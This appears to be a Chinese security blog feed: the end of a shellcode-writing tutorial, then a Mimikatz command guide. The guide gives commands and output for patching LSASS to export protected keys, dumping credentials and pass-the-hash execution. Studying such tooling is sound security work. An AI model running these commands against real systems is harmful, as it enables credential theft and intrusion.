class="line"><span class="keyword">char</span> szName[] = &#123; <span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="string">&#x27;x&#x27;</span>,<span class="string">&#x27;t&#x27;</span>,<span class="number">0</span> &#125;;</span><br><span class="line">pFn-&gt;fn_CreateFileA(szName, GENERIC_WRITE, <span class="number">0</span>, <span class="literal">NULL</span>, CREATE_ALWAYS, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后是<code>z.end.cpp</code>这里面只要写一个结束的函数就行</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;api.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ShellcodeEnd</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成代码，可以发现顺序完全一致</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/53.png?raw=true" alt="image-20200426230753970"></p><p>最后我们来看最终成果</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/ShellCode/54.gif?raw=true" alt="image-20200426230753970"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;Windows平台高效Shellcode编程技术实战&gt;</span><br><span class="line">https:&#x2F;&#x2F;bbs.bccn.net&#x2F;thread-464861-1-1.html</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>mimikatz使用说明</title>
    <link href="https://www.ascotbe.com/2020/04/14/Mimikatz/"/>
    <id>https://www.ascotbe.com/2020/04/14/Mimikatz/</id>
    <published>2020-04-14T15:07:46.000Z</published>
    <updated>2021-05-04T06:03:28.416Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><blockquote><p>前言</p></blockquote><p>只记录自己用过的命令</p><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/1.png?raw=true" alt="1"></p><ul><li><p><code>exit</code>:退出当前程序</p></li><li><p><code>cls</code>:清屏</p></li><li><p><code>answer</code>:对生命、宇宙和万物的终极问题的回答。</p></li><li><p><code>coffee</code>：显示一杯咖啡图案，请阿姨喝杯卡布奇诺。</p></li><li><p><code>sleep</code>：默认睡眠 <code>1000ms</code>，后跟时间参数，比如<code>sleep 5000</code>，就会睡眠<code>5000ms</code>。</p></li><li><p><code>log</code>：记录 <strong>Mimikatz</strong> 所有的输入和输出到当前目录下的 <code>log.txt </code>文件，它只会记录输入<code>log</code>命令后的输入和输出，当你没有启动这个命令之前的所有命令都不会记入进去。</p></li><li><p><code>base64</code>：将输入/输出转换成 <code>base64</code> 编码。</p></li><li><p><code>version</code>：查看<strong>Mimikatz</strong>的版本</p></li><li><p><code>cd</code>：切换或者显示当前目录。与<code>linux</code>命令相同</p></li><li><p><code>localtime</code>：显示系统当前时间和 <code>UTC</code> 时间。</p></li><li><p><code>hostname</code>：显示主机的名称。</p></li></ul><h2 id="使用模块"><a href="#使用模块" class="headerlink" title="使用模块"></a>使用模块</h2><p>输入<code>::</code>显示其支持模块信息。</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/2.png?raw=true" alt="2"></p><blockquote><h3 id="standard：标准模块，基本命令，不需要模块信息"><a href="#standard：标准模块，基本命令，不需要模块信息" class="headerlink" title="standard：标准模块，基本命令，不需要模块信息"></a>standard：标准模块，基本命令，不需要模块信息</h3></blockquote><p>该模块就是上文中的基础命令</p><blockquote><h3 id="crypto：加密模块，其后跟以下参数"><a href="#crypto：加密模块，其后跟以下参数" class="headerlink" title="crypto：加密模块，其后跟以下参数"></a>crypto：加密模块，其后跟以下参数</h3></blockquote><p>下图是参数列表</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/3.png?raw=true" alt="3"></p><p> CRYPTO模块提供了与Windows加密功能（<a href="https://msdn.microsoft.com/en-us/library/ms867086.aspx">CryptoAPI</a>）交互的高级功能。<br>通常的用途是导出未标记为“可导出”的证书。</p><table><thead><tr><th>参数名</th><th>说明</th></tr></thead><tbody><tr><td>providers</td><td>该命令列出所有 CryptoAPI 提供者。</td></tr><tr><td>stores</td><td>列出系统存储中的逻辑存储，crypto::stores</td></tr><tr><td>certificates</td><td>显示或者导出证书。</td></tr><tr><td>keys</td><td>列出或者显示密钥</td></tr><tr><td>sc</td><td>此命令列出系统上的智能卡/令牌读取器或将其移出系统；当 CSP 可用时，它会尝试在智能卡上列出密钥。</td></tr><tr><td>hash</td><td>显示当前用户的的哈希（LM、NTLM、md5、sha1、sha2）计算值。</td></tr><tr><td>system</td><td>描述 Windows 系统证书（注册表或者 hive 文件）。</td></tr><tr><td>scauth</td><td>从 CA 创建一个认证（智能卡等）。</td></tr><tr><td>certtohw</td><td>尝试将软件 CA 导出到加密（虚拟）硬件中。</td></tr><tr><td>capi</td><td>修补 CryptoAPI 程序方便导出。</td></tr><tr><td>cng</td><td>修补 CNG 服务方便导出。</td></tr><tr><td>extract</td><td>从 CAPI RSA/AES 提供者获取密钥。</td></tr></tbody></table><blockquote><h4 id="providers"><a href="#providers" class="headerlink" title="providers"></a><strong>providers</strong></h4></blockquote><p>此命令列出所有提供程序：CryptoAPI，然后列出CNG（如果可用）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # crypto::providers</span><br><span class="line"></span><br><span class="line">CryptoAPI providers :</span><br><span class="line"> 0. RSA_FULL      ( 1) - Microsoft Base Cryptographic Provider v1.0</span><br><span class="line"> 1. DSS_DH        (13) - Microsoft Base DSS and Diffie-Hellman Cryptographic Provider</span><br><span class="line"> 2. DSS           ( 3) - Microsoft Base DSS Cryptographic Provider</span><br><span class="line"> 3. RSA_FULL      ( 1) - Microsoft Base Smart Card Crypto Provider</span><br><span class="line"> 4. DH_SCHANNEL   (18) - Microsoft DH SChannel Cryptographic Provider</span><br><span class="line"> 5. RSA_FULL      ( 1) - Microsoft Enhanced Cryptographic Provider v1.0</span><br><span class="line"> 6. DSS_DH        (13) - Microsoft Enhanced DSS and Diffie-Hellman Cryptographic Provider</span><br><span class="line"> 7. RSA_AES       (24) - Microsoft Enhanced RSA and AES Cryptographic Provider</span><br><span class="line"> 8. RSA_SCHANNEL  (12) - Microsoft RSA SChannel Cryptographic Provider</span><br><span class="line"> 9. RSA_FULL      ( 1) - Microsoft Strong Cryptographic Provider</span><br><span class="line"></span><br><span class="line">CryptoAPI provider types:</span><br><span class="line"> 0. RSA_FULL      ( 1) - RSA Full (Signature and Key Exchange)</span><br><span class="line"> 1. DSS           ( 3) - DSS Signature</span><br><span class="line"> 2. RSA_SCHANNEL  (12) - RSA SChannel</span><br><span class="line"> 3. DSS_DH        (13) - DSS Signature with Diffie-Hellman Key Exchange</span><br><span class="line"> 4. DH_SCHANNEL   (18) - Diffie-Hellman SChannel</span><br><span class="line"> 5. RSA_AES       (24) - RSA Full and AES</span><br><span class="line"></span><br><span class="line">CNG providers :</span><br><span class="line"> 0. Microsoft Key Protection Provider</span><br><span class="line"> 1. Microsoft Passport Key Storage Provider</span><br><span class="line"> 2. Microsoft Platform Crypto Provider</span><br><span class="line"> 3. Microsoft Primitive Provider</span><br><span class="line"> 4. Microsoft Smart Card Key Storage Provider</span><br><span class="line"> 5. Microsoft Software Key Storage Provider</span><br><span class="line"> 6. Microsoft SSL Protocol Provider</span><br><span class="line"> 7. Windows Client Key Protection Provider</span><br></pre></td></tr></table></figure><hr><blockquote><h4 id="stores"><a href="#stores" class="headerlink" title="stores"></a><strong>stores</strong></h4></blockquote><p>此命令列出系统存储中的逻辑存储。</p><ul><li><p><code>/systemstore</code>  该参数是可选参数并且默认为<code>CERT_SYSTEM_STORE_CURRENT_USER</code>，也可以替换为下面中的其中一种</p><ul><li><code>CERT_SYSTEM_STORE_CURRENT_USER</code> or <code>CURRENT_USER</code></li><li><code>CERT_SYSTEM_STORE_CURRENT_USER_GROUP_POLICY</code> or <code>USER_GROUP_POLICY</code></li><li><code>CERT_SYSTEM_STORE_LOCAL_MACHINE</code> or <code>LOCAL_MACHINE</code></li><li><code>CERT_SYSTEM_STORE_LOCAL_MACHINE_GROUP_POLICY</code> or <code>LOCAL_MACHINE_GROUP_POLICY</code></li><li><code>CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE</code> or <code>LOCAL_MACHINE_ENTERPRISE</code></li><li><code>CERT_SYSTEM_STORE_CURRENT_SERVICE</code> or <code>CURRENT_SERVICE</code></li><li><code>CERT_SYSTEM_STORE_USERS</code> or <code>USERS</code></li><li><code>CERT_SYSTEM_STORE_SERVICES</code> or <code>SERVICES</code></li></ul><p>使用方法如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # crypto::stores &#x2F;systemstore:local_machine</span><br><span class="line">Asking for System Store &#39;local_machine&#39; (0x00020000)</span><br><span class="line"> 0. My</span><br><span class="line"> 1. Root</span><br><span class="line"> 2. Trust</span><br><span class="line"> 3. CA</span><br><span class="line"> 4. TrustedPublisher</span><br><span class="line"> 5. Disallowed</span><br><span class="line"> 6. AuthRoot</span><br><span class="line"> 7. TrustedPeople</span><br><span class="line"> 8. ADDRESSBOOK</span><br><span class="line"> 9. ipcu</span><br><span class="line">10. Remote Desktop</span><br><span class="line">11. REQUEST</span><br><span class="line">12. SmartCardRoot</span><br><span class="line">13. TrustedDevices</span><br><span class="line">14. Windows Live ID Token Issuer</span><br></pre></td></tr></table></figure></li></ul><hr><blockquote><h4 id="sc"><a href="#sc" class="headerlink" title="sc"></a><strong>sc</strong></h4></blockquote><p>能列出读取智能卡或者令牌读取器，如果用CSP的时候能读取出智能卡的密钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # crypto::sc</span><br><span class="line">SmartCard readers:</span><br><span class="line"></span><br><span class="line"> * OMNIKEY CardMan 3x21 0</span><br><span class="line">    ATR  : 3bb794008131fe6553504b32339000d1</span><br><span class="line">    Model: G&amp;D SPK 2.3 T&#x3D;1</span><br><span class="line">    CSP  : SafeSign Standard Cryptographic Service Provider</span><br><span class="line"></span><br><span class="line"> 0. 34C99D73A1FAE4D44F9966DF626623DF18858C83</span><br><span class="line">    34C99D73A1FAE4D44F9966DF626623DF18858C83</span><br><span class="line">        Type           : AT_KEYEXCHANGE (0x00000001)</span><br><span class="line">        Exportable key : NO</span><br><span class="line">        Key size       : 1024</span><br><span class="line"></span><br><span class="line"> * SCM Microsystems Inc. SCR35xx USB Smart Card Reader 0</span><br></pre></td></tr></table></figure><hr><blockquote><h4 id="scauth"><a href="#scauth" class="headerlink" title="scauth"></a><strong>scauth</strong></h4></blockquote><p>创建用于用于智能卡身份验证的客户端证书</p><p>该命令中的参数</p><ul><li><p><code>/caname</code></p><p>证书颁发机构的主题名称（需要签署证书）</p></li><li><p><code>/castore</code> 可选</p><p>包含证书颁发机构的系统存储（默认值：<code>CERT_SYSTEM_STORE_LOCAL_MACHINE</code>）</p></li><li><p><code>/upn</code></p><p>指定的用户主体名称（<strong>UPN</strong>）（例如：<code>user@lab.local</code>）</p></li><li><p><code>/pfx</code> 可选</p><p>保存最终证书的文件名（默认：无文件，存储在<code>CERT_SYSTEM_STORE_CURRENT_USER</code>中）</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # crypto::scauth &#x2F;caname:KiwiAC &#x2F;upn:user@lab.local &#x2F;pfx:user.pfx</span><br><span class="line">CA store       : LOCAL_MACHINE</span><br><span class="line">CA name        : KiwiAC</span><br><span class="line">CA validity    : 22&#x2F;08&#x2F;2016 22:00:36 -&gt; 22&#x2F;08&#x2F;2021 22:10:35</span><br><span class="line">Certificate UPN: user@lab.local</span><br><span class="line">Key container  : &#123;a1bd29ec-4203-4aac-8159-40f28f96335b&#125;</span><br><span class="line">Key provider   : Microsoft Enhanced Cryptographic Provider v1.0</span><br><span class="line">Private Export : user.pfx - OK</span><br></pre></td></tr></table></figure><hr><blockquote><h4 id="certificates"><a href="#certificates" class="headerlink" title="certificates"></a><strong>certificates</strong></h4></blockquote><p>该参数里面有三个可以选值</p><ul><li><strong>/systemstore</strong> –可选–必须使用的系统存储（默认值：CERT_SYSTEM_STORE_CURRENT_USER）</li><li><strong>/store</strong> –可选–必须用于列出/导出证书的存储（默认：My）–带有crypto::stores的完整列表</li><li><strong>/export</strong> –可选–将所有证书导出到文件（DER中的公共部分，PFX文件中的私有部分–密码保护：mimikatz）</li><li><strong>/silent</strong> –可选–如果需要用户交互，则中止</li><li><strong>/nokey</strong> –可选–不要尝试与私钥进行交互</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # crypto::capi</span><br><span class="line">Local CryptoAPI patched</span><br><span class="line"></span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &#39;20&#39; OK</span><br><span class="line"></span><br><span class="line">mimikatz # crypto::cng</span><br><span class="line">&quot;KeyIso&quot; service patched</span><br><span class="line"></span><br><span class="line">mimikatz # crypto::certificates &#x2F;systemstore:local_machine &#x2F;store:my &#x2F;export</span><br><span class="line"> * System Store  : &#39;local_machine&#39; (0x00020000)</span><br><span class="line"> * Store         : &#39;my&#39;</span><br><span class="line"></span><br><span class="line"> 0. example.domain.local</span><br><span class="line">        Key Container  : example.domain.local</span><br><span class="line">        Provider       : Microsoft Software Key Storage Provider</span><br><span class="line">        Type           : CNG Key (0xffffffff)</span><br><span class="line">        Exportable key : NO</span><br><span class="line">        Key size       : 2048</span><br><span class="line">        Public export  : OK - &#39;local_machine_my_0_example.domain.local.der&#39;</span><br><span class="line">        Private export : OK - &#39;local_machine_my_0_example.domain.local.pfx&#39;</span><br></pre></td></tr></table></figure><hr><blockquote><h4 id="hash"><a href="#hash" class="headerlink" title="hash"></a><strong>hash</strong></h4></blockquote><p>使用可选的用户名对密码进行哈希处理</p><hr><blockquote><h4 id="keys"><a href="#keys" class="headerlink" title="keys"></a><strong>keys</strong></h4></blockquote><p>参数列表</p><ul><li><code>/provider</code> - 可选 - 旧版CryptoAPI提供程序（默认值：MS_ENHANCED_PROV）</li><li><code>/providertype</code> - 可选 - 旧版CryptoAPI提供程序类型（默认值：PROV_RSA_FULL）</li><li><code>/cngprovider</code> - 可选 - CNG提供程序（默认：Microsoft软件密钥存储提供程序）</li><li><code>/export</code> - 可选 - 将所有密钥导出到PVK文件</li><li><code>/silent</code> - 可选 - 如果需要用户交互，则中止</li></ul><p>提供者详细信息的完整列表<code>crypto::providers</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # crypto::keys &#x2F;export</span><br><span class="line"> * Store         : &#39;user&#39;</span><br><span class="line"> * Provider      : &#39;MS_ENHANCED_PROV&#39; (&#39;Microsoft Enhanced Cryptographic Provider v1.0&#39;)</span><br><span class="line"> * Provider type : &#39;PROV_RSA_FULL&#39; (1)</span><br><span class="line"> * CNG Provider  : &#39;Microsoft Software Key Storage Provider&#39;</span><br><span class="line"></span><br><span class="line">CryptoAPI keys :</span><br><span class="line"></span><br><span class="line"> 0. myCapiKey</span><br><span class="line">    223311d3b5d990f48c65070b883b9ef1_33b8db1c-b3d2-4912-b24e-fc0742b704c1</span><br><span class="line">        Type           : AT_KEYEXCHANGE (0x00000001)</span><br><span class="line">        Exportable key : YES</span><br><span class="line">        Key size       : 2048</span><br><span class="line">        Private export : OK - &#39;user_capi_0_myCapiKey.pvk&#39;</span><br><span class="line"></span><br><span class="line"> 1. OC_KeyContainer_Lync_user@domain.local</span><br><span class="line">    49e3a9228aa9a33357545413fba35d07_33b8db1c-b3d2-4912-b24e-fc0742b704c1</span><br><span class="line">        Type           : AT_SIGNATURE (0x00000002)</span><br><span class="line">        Exportable key : NO</span><br><span class="line">        Key size       : 2048</span><br><span class="line">        Private export : KO - ERROR kuhl_m_crypto_exportKeyToFile ; Export &#x2F; CreateFile (0x8009000b)</span><br><span class="line"></span><br><span class="line">CNG keys :</span><br><span class="line"></span><br><span class="line"> 0. mykey-d535a6d8-70f5-496f-8c85-17c8fd26f379</span><br><span class="line">    98a436bd6f4caa9b24379112b577f688_33b8db1c-b3d2-4912-b24e-fc0742b704c1</span><br><span class="line">        Exportable key : NO</span><br><span class="line">        Key size       : 2048</span><br><span class="line">        Private export : KO - ERROR kuhl_m_crypto_exportKeyToFile ; Export &#x2F; CreateFile (0x80090029)</span><br></pre></td></tr></table></figure><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/6.png?raw=true" alt="3"></p><hr><blockquote><h4 id="cng"><a href="#cng" class="headerlink" title="cng"></a><strong>cng</strong></h4></blockquote><p>此补丁在LSASS进程中修改KeyIso服务，以使不可导出的密钥可导出。仅当密钥提供者是Microsoft软件密钥存储提供者（您无需为其他提供者修补CNG）时，此功能才有用。可以与<code>crypto::certificates</code>和<code>crypto::keys</code>一起使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &#39;20&#39; OK</span><br><span class="line"></span><br><span class="line">mimikatz # crypto::cng</span><br><span class="line">&quot;KeyIso&quot; service patched</span><br></pre></td></tr></table></figure><blockquote><h3 id="sekurlsa-枚举用户凭证"><a href="#sekurlsa-枚举用户凭证" class="headerlink" title="sekurlsa 枚举用户凭证"></a>sekurlsa 枚举用户凭证</h3></blockquote><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/4.png?raw=true" alt="3"></p><table><thead><tr><th>参数名</th><th>说明</th></tr></thead><tbody><tr><td>msv</td><td>获取 LM &amp; NTLM 凭证，可以获取明文密码。</td></tr><tr><td>wdigest</td><td>获取 WDigest 凭证，可以获取明文密码。</td></tr><tr><td>kerberos</td><td>获取 Kerberos 凭证。</td></tr><tr><td>tspkg</td><td>获取 TsPkg 凭证。</td></tr><tr><td>livessp</td><td>获取 LiveSSP 凭证。</td></tr><tr><td>ssp</td><td>获取凭证</td></tr><tr><td>logonPasswords</td><td>获登录用户信息及密码，如果是在系统权限或者 psexec 进入的系统权限下，直接使用该命令，而无需运行 privilege::debug，否则需要运行该命令。</td></tr><tr><td>process</td><td>切换或者恢复到 lsass 初始状态。</td></tr><tr><td>minidump</td><td>切换或者恢复到 minidump 初始状态。</td></tr><tr><td>pth</td><td>Pass-the-hash</td></tr><tr><td>krbtgt</td><td>krbtgt!</td></tr><tr><td>dpapisystem</td><td>显示<code>DPAPI_SYSTEM</code>密码值。</td></tr><tr><td>tickets</td><td>显示 Kerberos 票据</td></tr><tr><td>ekeys</td><td>显示 Kerberos 加密密钥</td></tr><tr><td>dpapi</td><td>显示内存中的 MasterKeys。</td></tr><tr><td>credman</td><td>显示管理员凭证。</td></tr></tbody></table><blockquote><h4 id="pth"><a href="#pth" class="headerlink" title="pth"></a>pth</h4></blockquote><p>抓取到哈希以后就可以直接登录了，也可以直接通过哈希执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#执行命令</span><br><span class="line">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:ascotbe.com &#x2F;ntlm:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX &#x2F;run:\&quot;cmd &#x2F;c whoami\&quot;</span><br></pre></td></tr></table></figure><p>也可以执行运行命令弹出带有该哈希的本地CMD命令窗口，通过窗口使用PsExe来获取到目标CMD窗口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#弹出带有该哈希的本息CMD窗口</span><br><span class="line">sekurlsa::pth &#x2F;user:administrator &#x2F;domain:ascotbe.com &#x2F;ntlm:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX </span><br></pre></td></tr></table></figure><blockquote><h3 id="Kerberos-包模块"><a href="#Kerberos-包模块" class="headerlink" title="Kerberos 包模块"></a>Kerberos 包模块</h3></blockquote><blockquote><h3 id="privilege-特权模块"><a href="#privilege-特权模块" class="headerlink" title="privilege 特权模块"></a>privilege 特权模块</h3></blockquote><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/5.png?raw=true" alt="3"></p><table><thead><tr><th>参数名</th><th>说明</th></tr></thead><tbody><tr><td>debug</td><td>请求调试权限</td></tr><tr><td>driver</td><td>请求装载驱动权限</td></tr><tr><td>security</td><td>请求安全权限</td></tr><tr><td>tcb</td><td>请求 tcb 权限</td></tr><tr><td>backup</td><td>请求 backup 权限</td></tr><tr><td>restore</td><td>请求恢复权限</td></tr><tr><td>sysenv</td><td>请求系统环境权限</td></tr><tr><td>id</td><td>请求 id 特权，参数后跟具体的 id 值，例如请求特权 8：<code>privilege::id 8</code></td></tr><tr><td>name</td><td>请求指定名称的权限</td></tr></tbody></table><blockquote><h3 id="process-进程模块"><a href="#process-进程模块" class="headerlink" title="process 进程模块"></a>process 进程模块</h3></blockquote><table><thead><tr><th>参数名</th><th>说明</th></tr></thead><tbody><tr><td>list</td><td>列出进程</td></tr><tr><td>exports</td><td>导出进程列表</td></tr><tr><td>imports</td><td>导入进程列表</td></tr><tr><td>start</td><td>开始一个进程</td></tr><tr><td>stop</td><td>终止一个进程</td></tr><tr><td>suspend</td><td>挂起一个进程</td></tr><tr><td>resume</td><td>恢复一个进程</td></tr><tr><td>run</td><td>运行一个进程</td></tr></tbody></table><blockquote><h4 id="list"><a href="#list" class="headerlink" title="list"></a><strong>list</strong></h4></blockquote><p>列出正在运行的进程，左边为PID右边是进程名字</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/7.png?raw=true" alt="3"></p><hr><blockquote><h4 id="exports和imports"><a href="#exports和imports" class="headerlink" title="exports和imports"></a><strong>exports</strong>和<strong>imports</strong></h4></blockquote><p>这两个参数我没搞懂他有啥用，使用后一堆显示一堆windows API，疯狂刷屏</p><hr><blockquote><h4 id="start"><a href="#start" class="headerlink" title="start"></a><strong>start</strong></h4></blockquote><p>后跟进程的绝对路径，并且用<code>&quot;&quot;</code>号包含。比如启动计算器<code>process::start &quot;C:\Windows\SysWOW64\calc.exe&quot;</code></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/8.png?raw=true" alt="3"></p><hr><blockquote><h4 id="stop"><a href="#stop" class="headerlink" title="stop"></a><strong>stop</strong></h4></blockquote><p>用法<code>process::stop /pid:5376</code>（结束 pid 为5376的进程，注意空格别漏了）</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/9.png?raw=true" alt="3"></p><hr><blockquote><h4 id="suspend"><a href="#suspend" class="headerlink" title="suspend"></a><strong>suspend</strong></h4></blockquote><p>挂起一个进程，挂起的进程点击它没有任何反应</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/10.png?raw=true" alt="3"></p><hr><blockquote><h4 id="resume"><a href="#resume" class="headerlink" title="resume"></a><strong>resume</strong></h4></blockquote><p>可以恢复挂起的进程，如下图恢复了记事本的运行</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/11.png?raw=true" alt="3"></p><hr><blockquote><h4 id="run"><a href="#run" class="headerlink" title="run"></a><strong>run</strong></h4></blockquote><p>他会去寻找你想运行的<code>exe</code>进程，用法<code>process::run calc.exe</code></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/12.png?raw=true" alt="3"></p><p>运行<code>cmd.exe</code></p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/13.png?raw=true" alt="3"></p><blockquote><h3 id="service-服务模块"><a href="#service-服务模块" class="headerlink" title="service 服务模块"></a>service 服务模块</h3></blockquote><table><thead><tr><th>参数名</th><th>说明</th></tr></thead><tbody><tr><td>start</td><td>开始服务</td></tr><tr><td>remove</td><td>移除服务</td></tr><tr><td>stop</td><td>停止服务</td></tr><tr><td>suspend</td><td>暂停服务</td></tr><tr><td>resume</td><td>恢复服务</td></tr><tr><td>preshutdown</td><td>预关闭服务</td></tr><tr><td>shutdown</td><td>关闭服务</td></tr><tr><td>list</td><td>列出服务</td></tr><tr><td>+ -</td><td>安装 Mimikatz 服务。</td></tr><tr><td>- -</td><td>卸载 Mimikatz 服务</td></tr></tbody></table><p>注意：有些服务不能暂停也不能启动</p><blockquote><h4 id="stop-1"><a href="#stop-1" class="headerlink" title="stop"></a><strong>stop</strong></h4></blockquote><p>暂停某个服务</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/14.png?raw=true" alt="3"></p><hr><blockquote><h4 id="start-1"><a href="#start-1" class="headerlink" title="start"></a><strong>start</strong></h4></blockquote><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/15.png?raw=true" alt="3"></p><hr><blockquote><h4 id="remove"><a href="#remove" class="headerlink" title="remove"></a><strong>remove</strong></h4></blockquote><p>当我们删除一个服务的时候，如果改任务还在运行的话，你不会看到该服务消失，只有你删除的服务暂停运行的时候，该服务就会从列表中消失，看下图，删除后我们还能停止他，但是后面就不能启动他了，因为他已经不存在了</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/16.png?raw=true" alt="3"></p><hr><blockquote><h4 id="和"><a href="#和" class="headerlink" title="+ -和- -"></a><strong>+ -<strong>和</strong>- -</strong></h4></blockquote><p>分别是安装和卸载<code>mimikatz</code>服务</p><p><img src="https://github.com/Ascotbe/Random-img/blob/master/Mimikatz/17.png?raw=true" alt="3"></p><div class="note default modern"><p>其他命令用法没什么好讲的这里就不再概述了</p></div><blockquote><h3 id="lsadump-Lsa转储模块"><a href="#lsadump-Lsa转储模块" class="headerlink" title="lsadump Lsa转储模块"></a>lsadump Lsa转储模块</h3></blockquote><table><thead><tr><th>参数名</th><th>说明</th></tr></thead><tbody><tr><td>sam</td><td>该命令转储安全帐户管理器（SAM）数据库，它包含用户密码的 NTLM，有时包含 LM 哈希</td></tr><tr><td>secrets</td><td>从 registry 或者 hives 